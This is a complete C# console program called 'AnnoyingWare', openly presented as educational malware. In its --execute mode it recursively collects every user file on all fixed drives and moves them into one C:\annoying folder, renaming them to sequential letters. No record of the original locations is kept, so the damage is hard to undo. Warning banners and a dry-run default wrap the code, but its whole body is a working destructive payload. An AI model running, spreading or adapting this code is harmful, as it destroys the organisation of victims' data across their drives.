using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;

namespace AnnoyingWare
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("╔═══════════════════════════════════════════════════════════╗");
            Console.WriteLine("║              ANNOYINGWARE - EDUCATIONAL ONLY              ║");
            Console.WriteLine("║  This program demonstrates malicious file manipulation   ║");
            Console.WriteLine("║  DO NOT RUN ON PRODUCTION SYSTEMS                        ║");
            Console.WriteLine("╚═══════════════════════════════════════════════════════════╝");
            Console.ResetColor();
            Console.WriteLine();

            bool dryRun = true;
            string targetVolume = "C";

            // Parse command line arguments
            if (args.Length > 0 && args.Contains("--execute"))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] WARNING: Execution mode enabled!");
                Console.WriteLine("[!] This will ACTUALLY move and rename files!");
                Console.WriteLine("[!] Press Ctrl+C to cancel, or any key to continue...");
                Console.ResetColor();
                Console.ReadKey();
                dryRun = false;
            }

            if (args.Length > 0 && args.Any(a => a.StartsWith("--volume=")))
            {
                var volumeArg = args.First(a => a.StartsWith("--volume="));
                targetVolume = volumeArg.Split('=')[1];
            }

            Console.WriteLine($"[!] DryRun Mode: {dryRun}");
            Console.WriteLine($"[!] Target Volume: {targetVolume}:");
            Console.WriteLine();

            StartAnnoyingWare(targetVolume, dryRun);

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        static void StartAnnoyingWare(string targetVolume, bool dryRun)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[!] AnnoyingWare Starting...");
            Console.ResetColor();

            // Create the annoying directory
            string annoyingPath = $"{targetVolume}:\\annoying";

            if (!Directory.Exists(annoyingPath))
            {
                if (dryRun)
                {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine($"[DRY RUN] Would create: {annoyingPath}");
                    Console.ResetColor();
                }
                else
                {
                    Directory.CreateDirectory(annoyingPath);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Created: {annoyingPath}");
                    Console.ResetColor();
                }
            }

            // Find all volumes
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n[*] Scanning volumes...");
            Console.ResetColor();

            var volumes = FindAllVolumes();
            Console.WriteLine($"[*] Found volumes: {string.Join(", ", volumes)}");

            // Collect all files from all volumes
            var allFiles = new List<FileInfo>();
            foreach (var volume in volumes)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"\n[*] Scanning {volume}:\\");
                Console.ResetColor();

                try
                {
                    var volumeRoot = new DirectoryInfo($"{volume}:\\");
                    var files = GetFilesRecursive(volumeRoot)
                        .Where(f => !f.FullName.Contains("\\annoying\\") &&
                                   !f.FullName.Contains("\\Windows\\") &&
                                   !f.FullName.Contains("\\Program Files"))
                        .ToList();

                    allFiles.AddRange(files);
                    Console.WriteLine($"[*] Found {files.Count} files on {volume}:");
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Error scanning {volume}: {ex.Message}");
                    Console.ResetColor();
                }
            }

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\n[*] Total files to process: {allFiles.Count}");
            Console.WriteLine("\n[*] Starting file renaming and moving...");
            Console.ResetColor();

            // Rename and move files
            int index = 0;
            int processed = 0;
            int errors = 0;

            foreach (var file in allFiles)
            {
                string newName = GetNextFileName(index);
                string extension = file.Extension;
                string newFileName = $"{newName}{extension}";
                string newPath = Path.Combine(annoyingPath, newFileName);

                // Handle duplicates
                int counter = 1;
                while (File.Exists(newPath))
                {
                    newFileName = $"{newName}_{counter}{extension}";
                    newPath = Path.Combine(annoyingPath, newFileName);
                    counter++;
                }

                try
                {
                    if (dryRun)
                    {
                        if (processed < 10)
                        {
                            Console.ForegroundColor = ConsoleColor.Cyan;
                            Console.WriteLine($"[DRY RUN] Would move: {file.FullName} -> {newPath}");
                            Console.ResetColor();
                        }
                    }
                    else
                    {
                        file.MoveTo(newPath);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[+] Moved: {file.Name} -> {newFileName}");
                        Console.ResetColor();
                    }
                    processed++;
                }
                catch (Exception ex)
                {
                    errors++;
                    if (errors < 10)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[!] Error moving {file.FullName}: {ex.Message}");
                        Console.ResetColor();
                    }
                }

                index++;

                // Progress indicator
                if (processed % 100 == 0)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[*] Progress: {processed} files processed...");
                    Console.ResetColor();
                }
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n[*] AnnoyingWare Complete!");
            Console.WriteLine($"[*] Files processed: {processed}");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[*] Errors: {errors}");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[*] All files moved to: {annoyingPath}");
            Console.ResetColor();
        }

        static string GetNextFileName(int index)
        {
            const string letters = "abcdefghijklmnopqrstuvwxyz";
            string result = "";

            do
            {
                result = letters[index % 26] + result;
                index = (index / 26) - 1;
            } while (index >= 0);

            return result;
        }

        static List<string> FindAllVolumes()
        {
            var volumes = new List<string>();
            var drives = DriveInfo.GetDrives()
                .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
                .Select(d => d.Name.TrimEnd(':', '\\'))
                .ToList();

            return drives;
        }

        static IEnumerable<FileInfo> GetFilesRecursive(DirectoryInfo directory)
        {
            var files = new List<FileInfo>();

            try
            {
                files.AddRange(directory.GetFiles());

                foreach (var subDir in directory.GetDirectories())
                {
                    try
                    {
                        files.AddRange(GetFilesRecursive(subDir));
                    }
                    catch
                    {
                        // Skip directories we can't access
                    }
                }
            }
            catch
            {
                // Skip directories we can't access
            }

            return files;
        }
    }
}
